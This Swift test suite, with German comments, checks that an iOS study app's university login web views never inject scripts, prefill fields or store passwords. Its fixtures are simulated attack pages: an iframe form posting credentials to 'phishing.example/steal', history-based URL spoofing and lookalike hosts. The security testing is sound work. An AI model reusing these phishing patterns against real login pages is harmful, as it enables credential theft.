import SwiftUI
import UniFlowCore
import WebKit
import XCTest
@testable import UniFlow

/// Entscheidung des Inhabers (27.10.2026): Hochschul-Passwoerter merkt sich nur das System (iOS-Passwort-Autofill bzw.
/// iCloud-Schluesselbund im Anmeldefenster), nie UniFlow. Die Anmeldeansichten haben keine eigenen Skripte, keinen Kanal
/// zur Seite, fuellen kein Feld, greifen nicht in `autocomplete` ein und legen nichts im Schluesselbund ab.
///
/// Geprueft in echten WKWebViews mit der Konfiguration der App (`StudIPWebView.loginConfiguration`) und erfundenen,
/// lokalen Seiten - auch manipulierten (eingebettetes Fremdformular, fremde Rechner, http, eine Seite desselben Rechners,
/// die ihre Adresse auf den Anmeldepfad umschreibt). Kein Netz: `loadHTMLString` mit der Adresse als Basis, eine
/// Inhaltsregel blockiert jedes Nachladen, jede weitere Navigation (auch das Absenden) wird abgebrochen. Dazu die echten
/// Anmeldeansichten (Stud.IP, QIS, CAS/LSF) mit den Nachbildungen des Debug-Stubs und die Quellen der App.
@MainActor
final class UniversityLoginPolicyTests: XCTestCase {
    // MARK: Erfundene Anmeldeseiten (data-ac: das `autocomplete` der Seite, darf sich nie aendern)

    static let casURL = URL(string: "https://www.uni-hildesheim.de/sso/login?service=https%3A%2F%2Flsf.uni-hildesheim.de%2Fqisserver%2Frds%3Fstate%3Duser%26type%3D1")!
    static let luhSSOURL = URL(string: "https://sso.idm.uni-hannover.de/idp/profile/SAML2/Redirect/SSO?execution=e1s1")!
    static let studipLoginURL = URL(string: "https://studip.uni-hannover.de/dispatch.php/login")!
    static let qisURL = URL(string: "https://qis.verwaltung.uni-hannover.de/qisserver/rds?state=user&type=0")!
    static let learnwebFileURL = URL(string: "https://www.uni-hildesheim.de/learnweb2026/pluginfile.php/1/mod_resource/content/1/evil.html")!

    /// Aufbau wie das CAS der Uni Hildesheim (#username, #password mit autocomplete=off, Knopf name=submit)
    static let casPage = """
    <!doctype html><html><head><meta charset="utf-8"><title>Anmeldung (Test)</title></head><body>
    <form id="fm1" method="post" action="login">
    <input id="username" name="username" type="text" autocomplete="username" data-ac="username" value="">
    <input id="password" name="password" type="password" autocomplete="off" data-ac="off">
    <input type="hidden" name="execution" value="e1s1">
    <button name="submit" type="submit" value="Anmelden">Anmelden</button>
    </form></body></html>
    """

    /// Aufbau wie das WebSSO der LUH (loginname, password, _eventId_proceed)
    static let luhPage = """
    <!doctype html><html><head><meta charset="utf-8"></head><body>
    <form id="fm1" method="post" action="/idp/profile/SAML2/Redirect/SSO?execution=e1s1">
    <input id="loginname" name="loginname" type="text"><input id="password" name="password" type="password" autocomplete="current-password" data-ac="current-password">
    <button type="submit" name="_eventId_proceed">Anmelden</button></form></body></html>
    """

    /// Aufbau wie das HIS-QIS (Felder asdf/fdsa)
    static let qisPage = """
    <!doctype html><html><head><meta charset="utf-8"></head><body>
    <form id="fm1" method="post" action="/qisserver/rds?state=user&amp;type=1">
    <input type="text" name="asdf" id="asdf"><input type="password" name="fdsa" id="fdsa">
    <input type="submit" name="submit" value="Anmelden"></form></body></html>
    """

    /// Formular in einem eingebetteten Rahmen, ueber das DOM des leeren Rahmens gebaut (ohne Navigation)
    static func frameScript(action: String) -> String {
        """
        <iframe id="fremd"></iframe>
        <script>
        (function () {
          var d = document.getElementById('fremd').contentDocument;
          d.body.innerHTML = '<form id="fm1" method="post" action="\(action)">'
            + '<input id="username" name="username" type="text" autocomplete="username" data-ac="username">'
            + '<input id="password" name="password" type="password"><button name="submit" type="submit">Anmelden</button></form>';
        })();
        </script>
        """
    }

    /// Echte Anmeldeseite mit eingebettetem Fremdformular (gleiche Feldnamen, Ziel auf fremdem Rechner)
    static let framedPage = """
    <!doctype html><html><head><meta charset="utf-8"></head><body>
    <form id="hm" method="post" action="login">
    <input id="username" name="username" type="text"><input id="password" name="password" type="password">
    <button name="submit" type="submit">Anmelden</button></form>
    \(frameScript(action: "https://phishing.example/steal"))
    </body></html>
    """

    /// Seite desselben Rechners wie das CAS (z. B. hochgeladene Learnweb-Datei), die ihre Adresse ohne Navigation auf
    /// den Anmeldepfad umschreibt
    static func spoofPage(_ history: String) -> String {
        """
        <!doctype html><html><head><meta charset="utf-8"><script>history.\(history)(null, '', '/sso/login?service=x');</script></head><body>
        <form id="fm1" method="post" action="login"><input id="username" name="username" type="text">
        <input id="password" name="password" type="password"><button name="submit" type="submit">Anmelden</button></form>
        </body></html>
        """
    }

    /// Seite und Adresse, unter der sie geladen wird: echte Ziele, fremde Rechner, http, Same-Origin-Faelschung
    static var pages: [(String, String, URL)] {
        [("CAS", casPage, casURL), ("WebSSO", luhPage, luhSSOURL), ("Stud.IP-Login", luhPage, studipLoginURL), ("QIS", qisPage, qisURL),
         ("CAS mit Fremdrahmen", framedPage, casURL), ("replaceState", spoofPage("replaceState"), learnwebFileURL),
         ("pushState", spoofPage("pushState"), learnwebFileURL), ("fremder Rechner", casPage, URL(string: "https://phishing.example/sso/login?service=x")!),
         ("aehnlicher Rechner", casPage, URL(string: "https://www.uni-hildesheim.de.example.org/sso/login")!),
         ("http", casPage, URL(string: "http://www.uni-hildesheim.de/sso/login")!)]
    }

    private let typedUser = "testnutzer-erfunden"
    private let typedPassword = "Pw-Test-erfunden-123"

    // MARK: Webansicht mit der Konfiguration der App, ohne Netz

    final class Harness: NSObject, WKNavigationDelegate {
        let webView: WKWebView
        private(set) var blocked: [WKNavigationType] = []
        private(set) var finished = 0
        /// abgefangene Absendungen eines Formulars (die des Menschen im Test)
        var submissions: Int { blocked.filter { $0 == .formSubmitted }.count }
        private var allowNext = false

        init(rules: WKContentRuleList) {
            let config = StudIPWebView.loginConfiguration(dataStore: .nonPersistent())
            config.userContentController.add(rules)
            webView = WKWebView(frame: CGRect(x: 0, y: 0, width: 800, height: 600), configuration: config)
            super.init()
            webView.navigationDelegate = self
        }

        func load(_ html: String, at url: URL) {
            allowNext = true
            webView.loadHTMLString(html, baseURL: url)
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction,
                     decisionHandler: @escaping @MainActor (WKNavigationActionPolicy) -> Void) {
            // nur das eigene loadHTMLString; Absenden, Links, Weiterleitungen: abbrechen (nie ins Netz)
            if allowNext, navigationAction.navigationType == .other {
                allowNext = false
                decisionHandler(.allow)
            } else {
                blocked.append(navigationAction.navigationType)
                decisionHandler(.cancel)
            }
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { finished += 1 }

        func js(_ script: String) async throws -> String {
            let v = try await webView.evaluateJavaScript(script)
            return v.map { "\($0)" } ?? ""
        }
    }

    private func harness() async throws -> Harness {
        let rules = #"[{"trigger": {"url-filter": ".*"}, "action": {"type": "block"}}]"#
        let list = try await WKContentRuleListStore.default().compileContentRuleList(forIdentifier: "uniflow.tests.blockall.login",
                                                                                      encodedContentRuleList: rules)
        return Harness(rules: try XCTUnwrap(list))
    }

    private func waitUntil(_ what: String, timeout: TimeInterval = 10, _ condition: () async throws -> Bool) async throws {
        let end = Date().addingTimeInterval(timeout)
        while Date() < end {
            if try await condition() { return }
            try await Task.sleep(nanoseconds: 50_000_000)
        }
        XCTFail("Zeitueberschreitung: \(what)")
    }

    private func settle() async throws { try await Task.sleep(nanoseconds: 600_000_000) }

    private func loaded(_ h: Harness, _ html: String, _ url: URL) async throws {
        let before = h.finished
        h.load(html, at: url)
        try await waitUntil("Seite geladen") { h.finished > before }
    }

    /// Alle Eingabefelder (Hauptrahmen und eingebettete Rahmen) leer, `autocomplete` unveraendert, kein Kanal der App
    private static let untouchedCheck = """
    (function () {
      var docs = [document];
      var frames = document.querySelectorAll('iframe');
      for (var i = 0; i < frames.length; i++) { try { if (frames[i].contentDocument) docs.push(frames[i].contentDocument); } catch (e) {} }
      var out = [];
      for (var d = 0; d < docs.length; d++) {
        var inputs = docs[d].querySelectorAll('input');
        for (var k = 0; k < inputs.length; k++) {
          var el = inputs[k], t = String(el.type || 'text').toLowerCase();
          if ((t === 'text' || t === 'password' || t === 'email') && el.value !== '') out.push('gefuellt:' + (el.id || el.name));
          if ((el.getAttribute('autocomplete') || '') !== (el.getAttribute('data-ac') || '')) out.push('autocomplete:' + (el.id || el.name));
        }
      }
      var mh = window.webkit && window.webkit.messageHandlers;
      if (mh && mh.uniflowLogin) out.push('kanal');
      if (typeof window.__uniflowLoginDoc !== 'undefined') out.push('kennung');
      return out.join(',');
    })()
    """

    /// Wie ein Mensch tippen und auf "Anmelden" tippen (im Seitenkontext, nicht durch die App); `frame`: im eingebetteten
    /// Formular
    private func typeAndSubmit(_ h: Harness, frame: Bool = false) async throws {
        let root = frame ? "document.getElementById('fremd').contentDocument" : "document"
        _ = try await h.js("""
        (function () {
          var d = \(root);
          var inputs = d.querySelectorAll('input');
          for (var i = 0; i < inputs.length; i++) {
            var t = String(inputs[i].type || 'text').toLowerCase();
            if (t === 'password') inputs[i].value = '\(typedPassword)';
            else if (t === 'text' || t === 'email') inputs[i].value = '\(typedUser)';
          }
          var b = d.querySelector('button[type=submit], input[type=submit]');
          if (b) b.click(); else d.forms[0].requestSubmit();
          return 'ok';
        })()
        """)
    }

    /// Nichts von der Anmeldung im Schluesselbund der App (Dienst der Hochschulen, auch eines Tests) oder in den
    /// UserDefaults: kein Eintrag fuer Benutzername oder Passwort, kein Wert gleich dem eingetippten Passwort, keine
    /// Schalter "Auf diesem iPad merken"
    private func assertNothingStored(_ keychains: [UniversityKeychain], defaults: [UserDefaults], _ context: String,
                                     file: StaticString = #filePath, line: UInt = #line) {
        for k in keychains + [UniversityKeychain()] {
            for account in k.accounts() {
                XCTAssertFalse(UniversityProfile.isRetiredLoginSecret(account), "\(context): \(account)", file: file, line: line)
                XCTAssertNotEqual(k.read(account), typedPassword, "\(context): Passwort im Schluesselbund", file: file, line: line)
                XCTAssertNotEqual(k.read(account), typedUser, "\(context): Benutzername im Schluesselbund", file: file, line: line)
            }
        }
        for d in defaults + [.standard] {
            let keys = d.dictionaryRepresentation().keys
            XCTAssertFalse(keys.contains { $0.hasPrefix(UniversityPasswordCleanup.rememberPrefix) }, "\(context): Schalter", file: file, line: line)
            XCTAssertFalse(d.dictionaryRepresentation().values.contains { ($0 as? String) == typedPassword }, "\(context): Passwort in den UserDefaults",
                           file: file, line: line)
        }
    }

    // MARK: Konfiguration

    func testLoginConfigurationAddsNothingToThePage() {
        let store = WKWebsiteDataStore.nonPersistent()
        let config = StudIPWebView.loginConfiguration(dataStore: store)
        XCTAssertTrue(config.userContentController.userScripts.isEmpty, "kein Benutzerskript")
        XCTAssertTrue(config.websiteDataStore === store, "Datenspeicher des Containers, nie .default()")
    }

    /// Jede Anmeldeansicht (Stud.IP, QIS, CAS, erster Start) zeigt `StudIPWebView`, und die baut ihre Webansicht nur
    /// ueber `loginConfiguration`
    func testEveryLoginPaneUsesTheOneLoginConfiguration() throws {
        let sources = try Self.appSources()
        func code(_ name: String) throws -> String { try XCTUnwrap(sources.first { $0.name == name }, name).code.joined(separator: "\n") }
        for name in ["QISViews.swift", "HildesheimViews.swift", "FirstLoginFlow.swift", "UniversityLoginViews.swift"] {
            let c = try code(name)
            XCTAssertFalse(c.contains("WKWebViewConfiguration") || c.contains("WKWebView("), "\(name): eigene Webansicht")
        }
        let studip = try code("StudIPView.swift")
        XCTAssertEqual(studip.components(separatedBy: "WKWebViewConfiguration()").count - 1, 1, "eine Konfiguration")
        XCTAssertTrue(studip.contains("WKWebView(frame: .zero, configuration: Self.loginConfiguration(dataStore: dataStore))"))
        for name in ["StudIPView.swift", "QISViews.swift", "HildesheimViews.swift"] {
            XCTAssertTrue(try code(name).contains("UniversityLoginHint()"), "\(name): Hinweis unter dem Fenster")
        }
    }

    // MARK: Kein Skript fuellt Felder, auch nicht auf manipulierten Seiten

    func testNoFieldIsEverFilledAndAutocompleteStaysAsThePageSetIt() async throws {
        let h = try await harness()
        for (name, html, url) in Self.pages {
            try await loaded(h, html, url)
            if html.contains("iframe") {
                try await waitUntil("eingebetteter Rahmen steht (\(name))") {
                    try await h.js("String(!!(document.getElementById('fremd').contentDocument && document.getElementById('fremd').contentDocument.querySelector('#password')))") == "true"
                }
            }
            try await settle()
            let problems = try await h.js(Self.untouchedCheck)
            XCTAssertEqual(problems, "", name)
            XCTAssertTrue(h.webView.configuration.userContentController.userScripts.isEmpty, name)
        }
        XCTAssertFalse(h.blocked.contains { $0 == .formSubmitted || $0 == .linkActivated }, "kein Absenden, kein Klick: \(h.blocked)")
    }

    // MARK: Absenden legt nichts ab

    func testTypingAndSubmittingKeepsNothingInTheApp() async throws {
        let h = try await harness()
        for (name, html, url) in Self.pages {
            try await loaded(h, html, url)
            let framed = html.contains("iframe")
            if framed {
                try await waitUntil("eingebetteter Rahmen steht (\(name))") {
                    try await h.js("String(!!(document.getElementById('fremd').contentDocument && document.getElementById('fremd').contentDocument.querySelector('#password')))") == "true"
                }
            }
            let before = h.submissions
            try await typeAndSubmit(h)
            try await waitUntil("Absenden abgefangen (\(name))") { h.submissions > before }
            if framed {
                let n = h.submissions
                try await typeAndSubmit(h, frame: true)
                try await waitUntil("Absenden im Rahmen abgefangen (\(name))") { h.submissions > n }
            }
            try await settle()
            assertNothingStored([], defaults: [], name)
        }
        XCTAssertFalse(h.blocked.contains(.linkActivated), "die App klickt nichts: \(h.blocked)")
    }

    /// QIS, LSF und Learnweb lesen nach dem Laden den Seiteninhalt, um eine angemeldete Seite oder den Fehlertext des CAS
    /// zu erkennen: Der enthaelt nie, was eingetippt wurde.
    func testPageTextReadForSignInDetectionNeverContainsTheTypedPassword() async throws {
        let h = try await harness()
        try await loaded(h, Self.casPage, Self.casURL)
        _ = try await h.js("(function () { document.getElementById('username').value = '\(typedUser)'; document.getElementById('password').value = '\(typedPassword)'; return 'ok'; })()")
        let html = try await h.webView.evaluateJavaScript("document.documentElement.outerHTML", in: nil, contentWorld: .defaultClient) as? String
        let text = try XCTUnwrap(html)
        XCTAssertTrue(text.contains("id=\"password\""))
        XCTAssertFalse(text.contains(typedPassword), "eingetippte Werte stehen nicht im Seiteninhalt")
        XCTAssertFalse(text.contains(typedUser))
    }

    // MARK: Die echten Anmeldeansichten (Nachbildungen des Debug-Stubs, kein Netz)

    private static func accessibilityAutomation(_ on: Bool) -> Bool {
        guard let h = dlopen("/usr/lib/libAccessibility.dylib", RTLD_NOW), let f = dlsym(h, "_AXSSetAutomationEnabled") else { return false }
        typealias SetEnabled = @convention(c) (Int32) -> Void
        unsafeBitCast(f, to: SetEnabled.self)(on ? 1 : 0)
        return true
    }

    private func host<V: View>(_ view: V) -> UIView {
        XCTAssertTrue(Self.accessibilityAutomation(true))
        addTeardownBlock { _ = Self.accessibilityAutomation(false) }
        let frame = CGRect(x: 0, y: 0, width: 1024, height: 1200)
        let scene = UIApplication.shared.connectedScenes.compactMap { $0 as? UIWindowScene }.first
        let window = scene.map { UIWindow(windowScene: $0) } ?? UIWindow(frame: frame)
        window.frame = frame
        let hosting = UIHostingController(rootView: view)
        window.rootViewController = hosting
        window.makeKeyAndVisible()
        addTeardownBlock { @MainActor in window.isHidden = true }
        return hosting.view
    }

    private func webView(in view: UIView) -> WKWebView? {
        if let w = view as? WKWebView { return w }
        for s in view.subviews { if let w = webView(in: s) { return w } }
        return nil
    }

    private func texts(_ view: UIView) -> [String] {
        view.layoutIfNeeded()
        var out: [String] = []
        func visit(_ element: Any, depth: Int) {
            guard depth < 40 else { return }
            if let o = element as? NSObject {
                out += [o.accessibilityLabel, o.accessibilityValue, (o as? UIAccessibilityIdentification)?.accessibilityIdentifier].compactMap { $0 }
                for e in o.accessibilityElements ?? [] { visit(e, depth: depth + 1) }
                let n = o.accessibilityElementCount()
                if n != NSNotFound, n > 0 { for i in 0..<min(n, 500) { if let e = o.accessibilityElement(at: i) { visit(e, depth: depth + 1) } } }
            }
            if let v = element as? UIView, !(v is WKWebView) { for s in v.subviews { visit(s, depth: depth + 1) } }
        }
        visit(view, depth: 0)
        return out.filter { !$0.isEmpty }
    }

    /// Nachbildung laden, wie ein Mensch tippen und "Anmelden" tippen; die Ansicht muss die Anmeldung erkennen
    private func signInOnStub(_ view: UIView, page: String, done: () -> Bool, bed: ContainerTestBed) async throws {
        var web: WKWebView?
        try await waitUntil("Webansicht der Anmeldung (\(page))", timeout: 30) {
            web = webView(in: view)
            return web?.url?.lastPathComponent == "\(page).html" && web?.isLoading == false
        }
        let w = try XCTUnwrap(web)
        XCTAssertTrue(w.configuration.userContentController.userScripts.isEmpty, "\(page): kein Benutzerskript")
        let empty = try await w.evaluateJavaScript("Array.prototype.every.call(document.querySelectorAll('input'), function (e) { return e.value === '' })") as? Bool
        XCTAssertEqual(empty, true, "\(page): nichts vorausgefuellt")
        let shown = texts(view)
        XCTAssertTrue(shown.contains { $0.contains(UniversityLoginHint.text) }, "\(page): Hinweis auf iOS unter dem Fenster: \(shown)")
        XCTAssertFalse(shown.contains { $0.contains("Auf diesem iPad merken") || $0 == "login.remember" }, "\(page): kein eigener Schalter")
        _ = try await w.evaluateJavaScript("""
        (function () {
          var inputs = document.querySelectorAll('input');
          for (var i = 0; i < inputs.length; i++) inputs[i].value = inputs[i].type === 'password' ? '\(typedPassword)' : '\(typedUser)';
          document.querySelector('a.btn').click();
          return 'ok';
        })()
        """)
        try await waitUntil("angemeldet (\(page))", timeout: 30, done)
        assertNothingStored([bed.keychain], defaults: [bed.defaults], page)
    }

    private func withStub(_ body: () async throws -> Void) async throws {
        UserDefaults.standard.set(ContainerTestBed.stubDirectory.path, forKey: "UFLoginStub")
        defer { UserDefaults.standard.removeObject(forKey: "UFLoginStub") }
        XCTAssertTrue(DebugUniStub.isActive)
        try await body()
    }

    func testStudIPLoginPaneShowsTheHintAndKeepsNoPassword() async throws {
        let bed = try ContainerTestBed(name: "anmeldung-studip", clock: .fixed(berlin: "2026-10-27T09:00:00")!)
        try await withStub {
            var signedIn = false
            let view = host(StudIPLoginPane(base: StudIPSync.base, dataStore: .nonPersistent(), onSignedIn: { _ in signedIn = true }) { EmptyView() })
            try await signInOnStub(view, page: "studip", done: { signedIn }, bed: bed)
        }
        await bed.tearDown()
    }

    func testQISLoginPaneShowsTheHintAndKeepsNoPassword() async throws {
        let bed = try ContainerTestBed(name: "anmeldung-qis", clock: .fixed(berlin: "2026-10-27T09:00:00")!)
        let m = bed.manager()
        _ = try bed.open(m, bed.account(.luh))
        let qis = try XCTUnwrap(m.qis)
        qis.syncsAfterSignIn = false
        try await withStub {
            var signedIn = false
            let view = host(QISLoginPane(connection: qis, onSignedIn: { signedIn = true }) { EmptyView() })
            try await signInOnStub(view, page: "qis", done: { signedIn && qis.isConnected }, bed: bed)
        }
        await bed.tearDown()
    }

    func testHildesheimLoginPaneShowsTheHintAndKeepsNoPassword() async throws {
        let bed = try ContainerTestBed(name: "anmeldung-cas", clock: .fixed(berlin: "2026-10-27T09:00:00")!)
        let m = bed.manager()
        _ = try bed.open(m, bed.account(.hildesheim))
        let hi = try XCTUnwrap(m.hildesheim)
        hi.syncsAfterSignIn = false
        try await withStub {
            let login = HildesheimLogin(target: .lsf, connection: hi)
            let view = host(HildesheimLoginPane(login: login) { EmptyView() })
            try await signInOnStub(view, page: "lsf", done: { login.stage == .done && hi.lsfConnected }, bed: bed)
        }
        await bed.tearDown()
    }

    // MARK: Quellen der App

    struct Source {
        let name: String
        let text: String
        /// Zeilen ohne reine Kommentarzeilen
        var code: [String] {
            text.components(separatedBy: "\n").filter {
                let t = $0.trimmingCharacters(in: .whitespaces)
                return !t.hasPrefix("//")
            }
        }
    }

    static func appSources() throws -> [Source] {
        let root = ContainerTestBed.repoURL("apps/apple/UniFlow")
        let files = FileManager.default.enumerator(at: root, includingPropertiesForKeys: nil)?.compactMap { $0 as? URL } ?? []
        return try files.filter { $0.pathExtension == "swift" }.map { Source(name: $0.lastPathComponent, text: try String(contentsOf: $0, encoding: .utf8)) }
    }

    func testAppSourcesHaveNoPasswordStoreAndNoFormScripts() throws {
        let sources = try Self.appSources()
        XCTAssertGreaterThan(sources.count, 50, "Quellen gefunden")
        for s in sources {
            let code = s.code.joined(separator: "\n")
            for forbidden in ["WKUserScript", "addUserScript", "WKScriptMessageHandler", "callAsyncJavaScript", "messageHandlers",
                              "UniversityCredential", "UniversityLoginAutofill", "UniversityRememberBar", "prefillCredential",
                              "Auf diesem iPad merken", "füllt sie beim nächsten Mal", "setAttribute(", "autocomplete="] {
                XCTAssertFalse(code.contains(forbidden), "\(s.name): \(forbidden)")
            }
            // Seitenskripte nur zum Lesen des Seiteninhalts (Erkennung der angemeldeten Seite), nie zum Setzen von Werten
            for line in s.code where line.contains("evaluateJavaScript(") {
                XCTAssertTrue(line.contains("evaluateJavaScript(\"document.documentElement.outerHTML\""), "\(s.name): \(line)")
            }
            // keine Schluesselbund-Namen fuer Benutzername oder Passwort
            for field in UniversityProfile.retiredLoginFields {
                XCTAssertFalse(code.contains("field: \"\(field)\""), "\(s.name): \(field)")
                XCTAssertFalse(code.contains(".\(field)\")"), "\(s.name): .\(field)")
            }
        }
        let tokens = try XCTUnwrap(sources.first { $0.name == "UniversityTokens.swift" })
        XCTAssertFalse(tokens.code.joined().contains("password:"), "der Speicher nimmt kein Passwort an")
    }
}
